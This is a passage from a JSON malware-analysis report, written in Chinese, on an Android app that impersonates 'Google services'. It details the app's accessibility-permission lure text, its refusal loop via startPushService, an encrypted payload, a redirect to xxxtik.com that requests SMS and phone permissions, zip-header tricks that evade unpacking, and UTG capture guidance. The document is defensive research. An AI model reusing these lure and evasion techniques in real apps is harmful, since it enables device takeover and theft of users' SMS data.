    "refusal_loop_mechanism": "页面尾部脚本判定 android.isAccessibilityServiceEnabled() 为 false 时执行 android.startPushService()，反复拉起 PushService（exported=true、stopWithTask=false）以维持远端控制通道并重新呈现引导；inject.js 在页面加载 1 秒后强制写入 android.setVar(\"ACB_Cancel\",\"go\")，压制取消路径。是否另有 onResume 定时重跳由加密载荷决定，静态不可见。",
    "overlay_or_fake_settings": "未发现高仿系统无障碍开关页或半透明遮罩资源（无对应 layout/悬浮窗配置残留）；引导以普通 WebView 页面形式呈现。是否在跳转系统设置后压栈遮罩，需壳层运行时确认，静态不可还原。",
    "restricted_settings_13plus_coaching": "有分步教学，但面向的是无障碍服务的常规路径而非 Android 13 受限设置：step_1 进入设置、step_2 打开「已下载的服务/Downloaded Services」（Xiaomi 变体为「已下载的应用/Downloaded apps」，Samsung 变体为「已安装的应用/Installed apps」）、step_3 为 'Google services' 启用服务。未见「应用详情右上角菜单允许受限设置」或 Session 安装器绕过文案。",
    "post_grant_anti_removal": "静态未见。无障碍服务以 0xFFFFFFFF 全事件监听 + canRequestFilterKeyEvents + canPerformGestures 组合，具备通过 GLOBAL_ACTION_BACK/HOME 阻止撤权的技术能力，但具体反撤权实现位于加密载荷 assets/iMpd.json，本次无法确认。",
    "benign_graceful_degradation": "无。未授权时不存在任何降级或替代路径，而是转去拉起 PushService 维持远端通道。"
  },
  "utg_capture_guidance": {
    "best_trigger_hook": "在应用冷启动后 WebView 页面渲染完成时拉起 UTG 抓取（识别到页面文本包含 'Activate Accessibility services' 或按钮 'Go to Settings'）；同时监测 android.openAccessibilitySettings 触发的 Activity 跳转（目标为 Settings$AccessibilitySettings / ACTION_ACCESSIBILITY_SETTINGS），在跳转瞬间与从系统设置返回前台的两个时刻各抓一次。",
    "key_pages_to_capture": [
      {
        "page_role": "冷启动引导弹窗页 / WebView 教学页（第一屏）",
        "page_identifier": "全屏 WebView，灰色背景 #F5F5F5，顶部标题 'Google services'，中部蓝色高亮 'Accessibility services' 说明语，下方三行 Step 1/2/3，底部蓝色按钮 'Go to Settings'，无返回/取消控件",
        "why_most_useful": "这是全部诱导文案的唯一载体，直接给出品牌冒充（Google services）、分步教学与无取消设计三项判定依据",
        "observable_utg_signals": ["页面标题文本 'Google services'", "说明语 'Activate Accessibility services for the correct application work.'", "三行 'Step 1. - Go to Settings' / 'Step 2. - Open \"Downloaded Services\"' / 'Step 3. - Activate services for the <a>Google services</a>'", "唯一按钮文本 'Go to Settings'，页面无取消/关闭/跳过按钮节点", "按机型切换的 step_2 文案（Xiaomi 'Downloaded apps' / Samsung 'Installed apps'）"]
      },
      {
        "page_role": "系统无障碍服务列表项",
        "page_identifier": "系统设置 → 无障碍 → 已下载的服务，列表中出现名为 'Google services' 的条目，副标题/描述区无实质用途说明",
        "why_most_useful": "证明用户在系统层面看到的是冒充 Google 的服务名，且用途说明缺失，是身份混淆与告知不足的直接证据",
        "observable_utg_signals": ["列表项文本 'Google services'", "该条目描述区为空或仅重复服务名", "该条目所属包名 semplo.ic327.skin（与 'Google' 品牌不符）"]
      },
      {
        "page_role": "跳转后返回前台的压栈页 / 拒权反馈页",
        "page_identifier": "从系统设置返回后重新出现的同一 WebView 引导页；同时观测是否出现 PushService 前台通知或悬浮窗",
        "why_most_useful": "用于确认拒权反馈循环（startPushService 反复拉起）与是否存在设置页压栈遮罩，这是区分'引导'与'强制'的关键运行期证据",
        "observable_utg_signals": ["返回后引导页再次全屏出现（非正常退出）", "通知栏出现与 'Google services' 相关的常驻通知", "若存在遮罩：无障碍设置页上方出现半透明 WebView/悬浮层且无法通过返回键关闭"]
      },
      {
        "page_role": "获权后远端页面",
        "page_identifier": "WebView 跳转至 https://xxxtik.com，随后连续弹出存储/短信/电话状态权限请求与忽略电池优化对话框",
        "why_most_useful": "证实无障碍授权是后续权限索取与远端控制的前置门槛，明确恶意链条走向",
        "observable_utg_signals": ["地址栏/URL 含 xxxtik", "权限弹窗文本含 READ_SMS / RECEIVE_SMS / READ_PHONE_STATE", "5 秒与 10 秒后各出现一次 '忽略电池优化' 系统对话框"]
      }
    ],
    "needs_ocr_for_image_lure": false,
    "detection_blindspot_note": "存在三处盲区：1) 真实业务代码在加密资产 assets/iMpd.json（5.1MB 高熵）中，classes.dex 仅 2 个壳类，ACTION_ACCESSIBILITY_SETTINGS 的具体构造、WebView 宿主 Activity 映射、是否压栈遮罩均不可静态确认；2) 授权后跳转的远端页面 xxxtik.com 内容由服务器下发，属远端 HTML，本地无副本；3) 66 个 zip 条目被置加密标志并将资源条目名伪造成 classes.dex/xml/、AndroidManifest.xml/layout/ 路径，常规解包工具会得到错乱目录结构而漏读无障碍配置——本次须绕过 zip 加密标志直接 inflate 才能读到 accessibilityservice.xml。注意静态加密不阻挡运行期 UTG：引导页 HTML 为明文，UTG 仍可完整捕获全部诱导文案。"
  },
  "behavior_pattern_tags": [
    "TRIG_COLD_START_BLOCK",
    "CARRIER_WEBVIEW_LOCAL_HTML",
    "CARRIER_SYSTEM_A11Y_DESCRIPTION",
    "LURE_RESTRICTED_SETTINGS_COACHING",
    "LURE_DISMISS_SYSTEM_WARNING",
    "COERCE_NO_SKIP_NON_CANCELABLE",
    "COERCE_REFUSAL_LOOP_RELAUNCH",
    "ID_SYSTEM_OR_BRAND_IMPERSONATION",
    "ID_MULTI_ALIAS_CAMOUFLAGE",
    "ID_FAKE_IS_ACCESSIBILITY_TOOL",
    "STATIC_PACKED_OR_ENCRYPTED_PAYLOAD"
  ],
  "code_anchors": [
    "assets/www/index.html#L11 (var app_title = 'Google services')",
    "assets/www/index.html#L23-L57 (switch(lang) 四语言 foAccess/step_1/step_2/step_3/btn1 文案)",
    "assets/www/index.html#L389 (<button id=\"btn1\" onclick=\"android.openAccessibilitySettings(true)\">)",
    "assets/www/index.html#L446-L450 (isAccessibilityServiceEnabled 判定 → xxxtik.com 或 startPushService)",
    "assets/www/inject.js#L1-L17 (requestPermissions 批量索取短信/存储/电话状态 + ACB_Cancel + requestIgnoreBatteryOptimizations)",
    "classes.dex/xml/accessibilityservice.xml (android:accessibilityEventTypes=0xFFFFFFFF, canRetrieveWindowContent/canPerformGestures/canRequestFilterKeyEvents/canTakeScreenshot=true, isAccessibilityTool=true)"
  ]
}
```

</details>
